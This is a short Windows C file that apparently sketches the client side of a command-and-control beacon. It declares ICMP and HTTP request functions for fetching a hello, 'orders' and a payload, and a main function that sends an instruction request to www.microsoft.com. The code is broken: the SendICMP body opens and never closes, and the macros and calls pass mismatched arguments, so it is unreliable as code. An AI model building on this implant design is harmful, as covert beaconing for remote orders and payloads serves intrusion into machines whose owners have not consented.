#include <windows.h>
#include <stdio.h>
#include "include/requests.h"

// ICMP
INT SendICMP(LPSTR destination, INT datasize, REQUEST_TYPE request_type, RESPONSE_TYPE* response_type, LPSTR payload) {

#define SendICMP_GetHello(destination) SendICMP(destination, 32, GET_HELLO);
#define SendICMP_GetOrders(destination) SendICMP(destination, 32, GET_INSTRUCTION);
#define SendICMP_GetPayload(destination) SendICMP(destination, 200, GET_PAYLOAD);

// HTTP
INT SendHTTP(LPSTR destination, REQUEST_TYPE request_type);

#define SendHTTP_GetHello(destination) SendHTTP(destination, GET_HELLO);
#define SendHTTP_GetOrders(destination) SendHTTP(destination, GET_INSTRUCTION);
#define SendHTTP_GetPayload(destination) SendHTTP(destination, GET_PAYLOAD);


INT main(VOID) {
	RESPONSE_TYPE response;
	CHAR payload[32];
	//SendICMP("8.8.8.8", 32, GET_HELLO, &response, &payload);
	//printf("\n%s", payload);
	SendHTTP("www.microsoft.com", GET_INSTRUCTION);
	return 0;
}
